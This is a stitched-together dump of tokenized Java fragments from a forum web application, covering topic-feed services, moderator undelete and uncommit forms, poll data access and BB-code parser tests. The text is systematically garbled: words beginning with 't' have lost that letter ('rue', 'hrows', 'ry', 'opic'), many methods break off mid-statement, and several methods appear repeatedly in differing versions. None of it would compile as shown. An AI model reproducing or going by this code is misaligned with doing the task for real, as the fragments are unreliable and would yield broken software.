public List < PreparedTopic > prepareMessages ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < PreparedTopic > ( messages . size ( ) ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , rue , null , secure , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public void appendMessage ( int msgid , String ext ) { jdbcTemplate . update ( " UPDATE msgbase SET message=message||? WHERE id=? " , 
public void escapeDoubleBrackets ( ) { assertEquals ( " <p>[[doNotTag]]</p> " , lorCodeService . parseComment ( " [[doNotTag]] " , rue ) ) ; assertEquals ( " <p>[[/doNotTag]]</p> " , lorCodeService . parseComment ( " [[/doNotTag]] " , rue ) ) ; assertEquals ( " <p>[b]</p> " , lorCodeService . parseComment ( " [[b]] " , rue ) ) ; assertEquals ( " <p>[/b]</p> " , lorCodeService . parseComment ( " [[/b]] " , rue ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[doNotTag]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[doNotTag]][/code] " , rue ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/doNotTag]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[/doNotTag]][/code] " , rue ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[b]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[b]][/code] " , rue ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/b]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[/b]][/code] " , rue ) ) ; assertEquals ( " <p>[[[doNotTag]]]</p> " , lorCodeService . parseComment ( " [[[doNotTag]]] " , rue ) ) ; assertEquals ( " <p>[[[/doNotTag]]]</p> " , lorCodeService . parseComment ( " [[[/doNotTag]]] " , rue ) ) ; assertEquals ( " <p>[[b]]</p> " , lorCodeService . parseComment ( " [[[b]]] " , rue ) ) ; assertEquals ( " <p>[[/b]]</p> " , lorCodeService . parseComment ( " [[[/b]]] " , rue ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[b]]</code></pre></div><p>[b]</p> " , lorCodeService . parseComment ( " [code][[b]][/code][[b]] " , rue ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/b]]</code></pre></div><p>[b]</p> " , lorCodeService . parseComment ( " [code][[/b]][/code][[b]] " , rue ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[code]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[code]][/code] " , rue ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/code]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[/code]][/code] " , rue ) ) ; 
private PreparedImage prepareImage ( Topic opic ) { String mediumName = Screenshot . getMediumName ( opic . getUrl ( ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; if ( ! new File ( htmlPath , mediumName ) . exists ( ) ) { mediumName = opic . getLinktext ( ) ; } ry { ImageInfo mediumImageInfo = new ImageInfo ( htmlPath + mediumName ) ; 
public ModelAndView handleUserNotFound ( Exception ex , HttpServletRequest request , HttpServletResponse response ) { return new ModelAndView ( " error-user-not-found " , " exception " , ex ) ; } 
public ModelAndView undeleteForm ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Topic message = messageDao . getById ( msgid ) ; checkUndeletable ( message ) ; ModelAndView mv = new ModelAndView ( " undelete " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareTopic ( message , false , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ) ; return mv ; } 
public ModelAndView uncommitForm ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Topic message = messageDao . getById ( msgid ) ; checkUncommitable ( message ) ; ModelAndView mv = new ModelAndView ( " uncommit " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareTopic ( message , false , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ) ; return mv ; } 
public PreparedTopic prepareTopic ( Topic message , boolean minimizeCut , boolean secure , User user ) { return prepareMessage ( message , messageDao . getTags ( message ) , minimizeCut , null , secure , user , null ) ; } 
public PreparedTopic prepareTopicPreview ( Topic message , List < String > ags , PreparedPoll newPoll , boolean secure , String ext ) { return prepareMessage ( message , ags , false , newPoll , secure , ext ) ; } 
public PreparedTopic prepareTopicPreview ( Topic message , List < String > ags , PreparedPoll newPoll , boolean secure , String ext ) { return prepareMessage ( message , ags , false , newPoll , secure , ext ) ; } 
private boolean doDeleteComment ( int msgid , String reason , User user , int scoreBonus ) { int deleteCount = jdbcTemplate . update ( deleteComment , msgid ) ; if ( deleteCount > 0 ) { deleteInfoDao . insert ( msgid , user , reason , scoreBonus ) ; 
public DeleteInfo mapRow ( ResultSet resultSet , int i ) hrows SQLException { Integer bonus = resultSet . getInt ( " bonus " ) ; if ( resultSet . wasNull ( ) ) { bonus = null ; } return new DeleteInfo ( resultSet . getString ( " nick " ) , 
public void insert ( int msgid , User deleter , String reason , int scoreBonus ) { jdbcTemplate . update ( INSERT_DELETE_INFO , msgid , deleter . getId ( ) , reason , scoreBonus ) ; } 
public DeleteInfoStat mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new DeleteInfoStat ( rs . getString ( " reason " ) , rs . getInt ( " count " ) , rs . getInt ( " sum " ) ) ; } 
public VoteDto mapRow ( ResultSet rs , int rowNum ) hrows SQLException { VoteDto dto = new VoteDto ( ) ; dto . setId ( rs . getInt ( " id " ) ) ; dto . setLabel ( rs . getString ( " label " ) ) ; return dto ; } 
public synchronized void add ( Object name , Object value ) hrows UnsupportedEncodingException { if ( value = = null ) { return ; } if ( ! query . rim ( ) . equals ( " " ) ) query + = " & " ; query + = URLEncoder . encode ( name . oString ( ) , " UTF-8 " ) + " = " + URLEncoder . encode ( value . oString ( ) , " UTF-8 " ) ; 
public ModelAndView mainPage ( HttpServletRequest request ) { Template mpl = Template . getTemplate ( request ) ; List < Topic > messages = feedTopicService . getMainPageFeed ( mpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ) ; if ( mpl . isModeratorSession ( ) | | mpl . isCorrectorSession ( ) ) { int uncommited = jdbcTemplate . queryForInt ( " select count(*) from topics,groups,sections where section=sections.id AND sections.moderate and topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = jdbcTemplate . queryForInt ( " select count(*) from topics,groups where section=1 AND topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } return mv ; } 
public ModelAndView gallery ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) hrows Exception { ModelAndView modelAndView = mainTopicsFeedHandler ( null , null , Section . SECTION_GALLERY , null , null , offset , request , response ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView forum ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) hrows Exception { ModelAndView modelAndView = mainTopicsFeedHandler ( null , null , Section . SECTION_FORUM , null , null , offset , request , response ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView polls ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) hrows Exception { ModelAndView modelAndView = mainTopicsFeedHandler ( null , null , Section . SECTION_POLLS , null , null , offset , request , response ) ; modelAndView . addObject ( " url " , " /polls/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView news ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) hrows Exception { ModelAndView modelAndView = mainTopicsFeedHandler ( null , null , Section . SECTION_NEWS , null , null , offset , request , response ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView galleryGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletRequest request , HttpServletResponse response ) hrows Exception { return group ( Section . SECTION_GALLERY , offset , groupName , request , response ) ; } 
public ModelAndView newsGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletRequest request , HttpServletResponse response ) hrows Exception { return group ( Section . SECTION_NEWS , offset , groupName , request , response ) ; } 
public ModelAndView pollsGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletRequest request , HttpServletResponse response ) hrows Exception { return group ( Section . SECTION_POLLS , offset , groupName , request , response ) ; } 
public ModelAndView galleryArchive ( @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletRequest request , HttpServletResponse response ) hrows Exception { ModelAndView modelAndView = mainTopicsFeedHandler ( month , year , Section . getSection ( section ) , null , null , null , request , response ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public View showUserTopics ( @RequestParam ( " nick " ) String nick , @RequestParam ( value = " output " , required = false ) String output ) { if ( output ! = null ) { return new RedirectView ( " /people/ " + nick + " /?output=rss " ) ; } return new RedirectView ( " /people/ " + nick + '/' ) ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; Section section = null ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; modelAndView . addObject ( " section " , section ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 1 ) ; List < Topic > messages = feedTopicService . getAllTopicsFeed ( section , calendar . getTime ( ) ) ; modelAndView . addObject ( " messages " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ) ; List < FeedTopicDto . DeletedTopic > deleted = feedTopicService . getDeletedTopicsFeed ( sectionId ) ; modelAndView . addObject ( " deletedTopics " , deleted ) ; modelAndView . addObject ( " sections " , sectionService . getSectionList ( ) ) ; return modelAndView ; } 
public View oldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " group " , required = false ) Integer groupId ) hrows Exception { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . oString ( offset ) ) ; } if ( year ! = null & & month ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . oString ( year ) + '/' + Integer . oString ( month ) ) ; } if ( groupId ! = null ) { Group group = groupDao . getGroup ( groupId ) ; return new RedirectView ( Section . getNewsViewerLink ( section ) + group . getUrlName ( ) + '/' ) ; } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
private void prepareTopicsForPlainOrRss ( HttpServletRequest request , ModelAndView modelAndView , String output , List < Topic > messages ) { boolean rss = output ! = null & & " rss " . equals ( output ) ; if ( rss ) { modelAndView . addObject ( 
private ModelAndView group ( int sectionId , Integer offset , String groupName , HttpServletRequest request , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSection ( sectionId ) ; Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( null , null , group . getSectionId ( ) , group . getId ( ) , null , offset , request , response ) ; modelAndView . addObject ( " url " , group . getUrl ( ) ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
private void setExpireHeaders ( HttpServletResponse response , Integer month , Integer year ) { if ( month = = null ) { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 1000 ) ; 
public FeedTopicDto . DeletedTopic mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new FeedTopicDto . DeletedTopic ( rs ) ; } 
public String oString ( ) { return new StringBuilder ( ) . append ( FeedTopicDto . class . oString ( ) ) 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month ) hrows UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " FeedTopicService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( ag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . oString ( ) ) ; FeedTopicDto feedTopicDto = new FeedTopicDto ( ) ; if ( section ! = null ) { feedTopicDto . getSections ( ) . add ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . COMMITED_ONLY ) ; } else { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { feedTopicDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { feedTopicDto . setTag ( agDao . getTagId ( ag ) ) ; } if ( month ! = null & & year ! = null ) { feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month , 1 ) ; feedTopicDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; feedTopicDto . setToDate ( calendar . getTime ( ) ) ; } else { feedTopicDto . setLimit ( 20 ) ; feedTopicDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; feedTopicDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( feedTopicDto ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean ech , boolean feedBurner ) { logger . debug ( new StringBuilder ( ) . append ( " FeedTopicService.getRssTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . append ( " ; noTalks= " ) . append ( noTalks ) . append ( " ; tech= " ) . append ( ech ) . append ( " ; feedBurner= " ) . append ( feedBurner ) . oString ( ) ) ; FeedTopicDto feedTopicDto = new FeedTopicDto ( ) ; if ( section ! = null ) { feedTopicDto . getSections ( ) . add ( section . getId ( ) ) ; } if ( group ! = null ) { feedTopicDto . setGroup ( group . getId ( ) ) ; } feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . MONTH_AGO ) ; feedTopicDto . setFromDate ( fromDate ) ; feedTopicDto . setNotalks ( noTalks ) ; feedTopicDto . setTech ( ech ) ; feedTopicDto . setLimit ( 20 ) ; if ( section . isPremoderated ( ) ) { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . COMMITED_ONLY ) ; } else { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . POSTMODERATED_ONLY ) ; } return ( feedBurner ) ? feedTopicDao . getTopics ( feedTopicDto ) 
public List < Topic > getAllTopicsFeed ( Section section , Date fromDate ) { logger . debug ( new StringBuilder ( ) . append ( " FeedTopicService.getAllTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . oString ( ) ) ; FeedTopicDto feedTopicDto = new FeedTopicDto ( ) ; feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . UNCOMMITED_ONLY ) ; if ( section ! = null ) { feedTopicDto . getSections ( ) . add ( section . getId ( ) ) ; } feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . MONTH_AGO ) ; feedTopicDto . setFromDate ( fromDate ) ; return getCachedFeed ( feedTopicDto ) ; } 
public int fixOffset ( Integer offset ) { if ( offset ! = null ) { if ( offset < 0 ) { 
private static String fixNL ( String ext ) { return ext . replaceAll ( NL_REGEXP , " [br] " ) ; } 
public void listTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [list][*]one[*]two[*]three[/list] " , false ) , " <ul><li>one</li><li>two</li><li>three</li></ul> " ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/list] " , false ) ) ; assertEquals ( " <ul><li>one " + 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month ) hrows UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " FeedTopicService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( ag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . oString ( ) ) ; FeedTopicDto feedTopicDto = new FeedTopicDto ( ) ; if ( section ! = null ) { feedTopicDto . getSections ( ) . add ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . COMMITED_ONLY ) ; } else { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { feedTopicDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { feedTopicDto . setTag ( agDao . getTagId ( ag ) ) ; } if ( month ! = null & & year ! = null ) { feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 ) ; feedTopicDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; feedTopicDto . setToDate ( calendar . getTime ( ) ) ; } else { feedTopicDto . setLimit ( 20 ) ; feedTopicDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; feedTopicDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( feedTopicDto ) ; } 
public Poll createNew ( List < PollVariant > newVariants ) { return new Poll ( id , 
public PollVariant mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new PollVariant ( rs . getInt ( " id " ) , rs . getString ( " label " ) ) ; } 
public Poll getPoll ( final int pollId ) hrows PollNotFoundException { final int currentPollId = getCurrentPollId ( ) ; ry { return jdbcTemplate . queryForObject ( queryPool , 
public Poll mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Poll ( pollId , 
public Integer apply ( PollVariantResult input ) { return input . getId ( ) ; } 
public PollVariantResult apply ( PollVariant input ) { PollVariantResult pollVariant = currentMap . get ( input . getId ( ) ) ; if ( pollVariant ! = null ) { return new PollVariantResult ( input . getId ( ) , input . getLabel ( ) , pollVariant . getVotes ( ) , pollVariant . getUserVoted ( ) ) ; 
public PreparedTopic prepareTopicPreview ( Topic message , List < String > ags , Poll newPoll , boolean secure , String ext ) { return prepareMessage ( message , 
public void voteGetCurrentPollTest ( ) hrows Exception { int currentPollId = pollDao . getCurrentPollId ( ) ; Poll poll = pollDao . getCurrentPoll ( ) ; Assert . assertEquals ( currentPollId , poll . getId ( ) ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month ) hrows UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " FeedTopicService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( ag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . oString ( ) ) ; FeedTopicDto feedTopicDto = new FeedTopicDto ( ) ; if ( section ! = null ) { feedTopicDto . getSections ( ) . add ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . COMMITED_ONLY ) ; } else { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { feedTopicDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { feedTopicDto . setTag ( agDao . getTagId ( ag ) ) ; } if ( month ! = null & & year ! = null ) { feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 ) ; feedTopicDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; feedTopicDto . setToDate ( calendar . getTime ( ) ) ; } else { feedTopicDto . setLimit ( 20 ) ; feedTopicDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; feedTopicDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( feedTopicDto ) ; } 
public ModelAndView mainPage ( HttpServletRequest request ) { Template mpl = Template . getTemplate ( request ) ; List < Topic > messages = opicListService . getMainPageFeed ( mpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ) ; if ( mpl . isModeratorSession ( ) | | mpl . isCorrectorSession ( ) ) { int uncommited = jdbcTemplate . queryForInt ( " select count(*) from topics,groups,sections where section=sections.id AND sections.moderate and topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = jdbcTemplate . queryForInt ( " select count(*) from topics,groups where section=1 AND topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } return mv ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; Section section = null ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; modelAndView . addObject ( " section " , section ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 1 ) ; List < Topic > messages = opicListService . getAllTopicsFeed ( section , calendar . getTime ( ) ) ; modelAndView . addObject ( " messages " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ) ; List < TopicListDto . DeletedTopic > deleted = opicListService . getDeletedTopicsFeed ( sectionId ) ; modelAndView . addObject ( " deletedTopics " , deleted ) ; modelAndView . addObject ( " sections " , sectionService . getSectionList ( ) ) ; return modelAndView ; } 
public TopicListDto . DeletedTopic mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new TopicListDto . DeletedTopic ( rs ) ; } 
public String oString ( ) { return new StringBuilder ( ) . append ( TopicListDto . class . oString ( ) ) 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month ) hrows UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( ag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . getSections ( ) . add ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agDao . getTagId ( ag ) ) ; } if ( month ! = null & & year ! = null ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( 20 ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( opicListDto ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean ech , boolean feedBurner ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getRssTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . append ( " ; noTalks= " ) . append ( noTalks ) . append ( " ; tech= " ) . append ( ech ) . append ( " ; feedBurner= " ) . append ( feedBurner ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . getSections ( ) . add ( section . getId ( ) ) ; } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; opicListDto . setFromDate ( fromDate ) ; opicListDto . setNotalks ( noTalks ) ; opicListDto . setTech ( ech ) ; opicListDto . setLimit ( 20 ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return ( feedBurner ) ? opicListDao . getTopics ( opicListDto ) 
public List < Topic > getAllTopicsFeed ( Section section , Date fromDate ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getAllTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; opicListDto . setCommitMode ( TopicListDao . CommitMode . UNCOMMITED_ONLY ) ; if ( section ! = null ) { opicListDto . getSections ( ) . add ( section . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; opicListDto . setFromDate ( fromDate ) ; return getCachedFeed ( opicListDto ) ; } 
